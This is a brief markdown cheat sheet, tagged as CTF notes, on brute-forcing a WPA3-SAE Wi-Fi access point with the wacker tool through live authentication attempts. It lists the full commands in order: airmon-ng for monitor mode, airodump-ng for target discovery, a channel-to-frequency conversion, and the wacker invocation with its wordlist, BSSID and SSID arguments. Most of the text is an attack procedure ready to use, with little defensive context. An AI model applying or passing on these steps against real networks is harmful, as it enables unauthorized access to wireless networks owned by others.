

**Tool:** [wacker](https://github.com/blunderbuss-wctf/wacker) **Use case:** WPA3-SAE AP, no connected clients → can't capture handshake → brute force live auth instead of offline cracking.

### Steps

1. Monitor mode:

```bash
airmon-ng start wlan0
```

2. Scan for target:

```bash
airodump-ng wlan0mon
```

Get: `BSSID`, `channel`, `SSID`, `ENC` (confirm WPA3/SAE)

3. Convert channel → freq:

```
freq = 2407 + (5 * channel)   # 2.4GHz
```

4. Run wacker:

```bash
python3 wacker.py --wordlist <wordlist> --interface <mon_iface> --bssid <BSSID> --ssid <SSID> --freq <freq>
```

Add `--debug` for verbose output, `--wpa2` if target is WPA2 not WPA3.

### Notes

- `--interface` must be the actual monitor-mode interface name (`iw dev` to check).
- WPA3 SAE resists offline PMKID/handshake cracking — wacker does **live** auth attempts against the AP instead.
- No client association required.

#tags: #wifi #wpa3 #sae #bruteforce #ctf


